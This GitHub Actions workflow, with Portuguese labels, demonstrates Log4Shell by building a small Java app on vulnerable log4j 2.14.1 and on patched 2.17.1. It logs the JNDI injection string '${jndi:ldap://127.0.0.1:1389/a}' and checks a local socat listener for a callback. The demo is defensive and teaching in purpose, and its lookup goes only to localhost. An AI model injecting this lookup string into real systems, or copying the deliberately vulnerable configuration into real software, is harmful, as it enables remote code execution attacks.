name: "üß™ Log4Shell ‚Äî comparativo vulner√°vel x corrigido (sa√≠da em tela)"

on:
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  demo:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - scenario: vulneravel
            LOG4J_VERSION: "2.14.1"
            JVM_ARGS: "-Dlog4j2.formatMsgNoLookups=false"
          - scenario: corrigido
            LOG4J_VERSION: "2.17.1"
            JVM_ARGS: "-Dlog4j2.enableJndi=false -Dlog4j2.enableJndiLookup=false -Dlog4j2.formatMsgNoLookups=true"

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup (Java/Maven + utilit√°rios)
        run: |
          sudo apt-get update -y
          sudo apt-get install -y maven jq socat unzip curl
          java -version; mvn -v

      - name: Criar projeto (pom.xml + App.java)
        run: |
          mkdir -p src/main/java/com/example
          cat > pom.xml <<'XML'
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>log4j-lab</artifactId>
            <version>1.0.0</version>
            <properties>
              <maven.compiler.source>11</maven.compiler.source>
              <maven.compiler.target>11</maven.compiler.target>
              <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>
            <dependencies>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-api</artifactId>
                <version>${log4j.version}</version>
              </dependency>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>${log4j.version}</version>
              </dependency>
            </dependencies>
            <build>
              <plugins>
                <plugin>
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>exec-maven-plugin</artifactId>
                  <version>3.1.0</version>
                  <configuration>
                    <mainClass>com.example.App</mainClass>
                  </configuration>
                </plugin>
              </plugins>
            </build>
          </project>
          XML

          cat > src/main/java/com/example/App.java <<'JAVA'
          package com.example;
          import org.apache.logging.log4j.LogManager;
          import org.apache.logging.log4j.Logger;

          public class App {
              private static final Logger logger = LogManager.getLogger(App.class);
              public static void main(String[] args) {
                  String entrada = System.getenv().getOrDefault(
                      "LOG_INPUT",
                      "${jndi:ldap://127.0.0.1:1389/a}"
                  );
                  logger.info("Iniciando app Log4j (demo segura)...");
                  // Mensagem DIRETA (n√£o usar "{}") para acionar lookup em vers√µes vulner√°veis
                  logger.error(entrada);
                  System.out.println("APP_DONE");
              }
          }
          JAVA

      - name: Build (log4j-core ${{ matrix.LOG4J_VERSION }})
        run: |
          mvn -q -DskipTests -Dlog4j.version="${{ matrix.LOG4J_VERSION }}" package
          echo "==> log4j-core efetivo: ${{ matrix.LOG4J_VERSION }}"

      - name: Baixar JAR oficial e checar JndiLookup (vetor)
        run: |
          mkdir -p target/deps
          URL="https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/${{ matrix.LOG4J_VERSION }}/log4j-core-${{ matrix.LOG4J_VERSION }}.jar"
          curl -fsSL "$URL" -o "target/deps/log4j-core-${{ matrix.LOG4J_VERSION }}.jar"
          JAR="target/deps/log4j-core-${{ matrix.LOG4J_VERSION }}.jar"
          (unzip -l "$JAR" | grep -q 'JndiLookup.class' \
            && echo ">> JndiLookup PRESENTE (vetor existe)") \
            || echo ">> JndiLookup AUSENTE (vetor removido/desativado)"

      - name: Subir listener local (porta 1389) ‚Äî ${{ matrix.scenario }}
        run: |
          rm -f ldap-${{ matrix.scenario }}.log
          (socat -v -d -d TCP-LISTEN:1389,reuseaddr,fork - 2>&1 | tee ldap-${{ matrix.scenario }}.log) &
          echo $! > listener-${{ matrix.scenario }}.pid
          sleep 1

      - name: Executar app (input JNDI) ‚Äî ${{ matrix.scenario }}
        env:
          LOG_INPUT: '${jndi:ldap://127.0.0.1:1389/a}'
        run: |
          echo "===== EXECUTANDO APP (${{ matrix.scenario }}) ====="
          mvn -q \
            -Dexec.classpathScope=runtime \
            -Dlog4j.version="${{ matrix.LOG4J_VERSION }}" \
            org.codehaus.mojo:exec-maven-plugin:3.1.0:java \
            -Dexec.jvmArgs='${{ matrix.JVM_ARGS }}' \
            | tee app-run-${{ matrix.scenario }}.log
          echo "===== FIM DA EXECU√á√ÉO ====="
          sleep 2

      - name: Encerrar listener e imprimir capturas ‚Äî ${{ matrix.scenario }}
        if: always()
        run: |
          if [ -f listener-${{ matrix.scenario }}.pid ]; then kill $(cat listener-${{ matrix.scenario }}.pid) 2>/dev/null || true; fi
          echo "===== CAPTURA DO LISTENER ‚Äî ${{ matrix.scenario }} ====="
          if [ -s ldap-${{ matrix.scenario }}.log ]; then
            grep -E "accepting connection|CONNECT|TCP" -n ldap-${{ matrix.scenario }}.log || head -n 80 ldap-${{ matrix.scenario }}.log || true
          else
            echo "(vazio)"
          fi
          echo "===== TRECHO DO LOG DA APLICA√á√ÉO ‚Äî ${{ matrix.scenario }} ====="
          (grep -E "\$\{jndi" -n app-run-${{ matrix.scenario }}.log || head -n 20 app-run-${{ matrix.scenario }}.log) 2>/dev/null || true

      - name: Verifica√ß√£o autom√°tica (pass/fail did√°tico)
        run: |
          HAS_LOG=1; HAS_CONN=1
          grep -Eq '\$\{jndi:ldap://127\.0\.0\.1:1389/' app-run-${{ matrix.scenario }}.log && HAS_LOG=0 || true
          grep -Eq 'accepting connection.*:1389' ldap-${{ matrix.scenario }}.log && HAS_CONN=0 || true
          if [ "${{ matrix.scenario }}" = "vulneravel" ]; then
            if [ $HAS_LOG -eq 0 ] && [ $HAS_CONN -eq 0 ]; then
              echo "‚úÖ Vulner√°vel: lookup JNDI foi tentado (conex√£o vista)"; exit 0
            else
              echo "‚ùå Esperava ver conex√£o no cen√°rio vulner√°vel e n√£o vi"; exit 1
            fi
          else
            if [ $HAS_CONN -ne 0 ]; then
              echo "‚úÖ Corrigido: nenhuma conex√£o ao listener"; exit 0
            else
              echo "‚ùå N√£o deveria haver conex√£o no cen√°rio corrigido"; exit 1
            fi
          fi

      - name: Artefatos (opcional)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: "outputs-${{ matrix.scenario }}"
          path: |
            app-run-${{ matrix.scenario }}.log
            ldap-${{ matrix.scenario }}.log
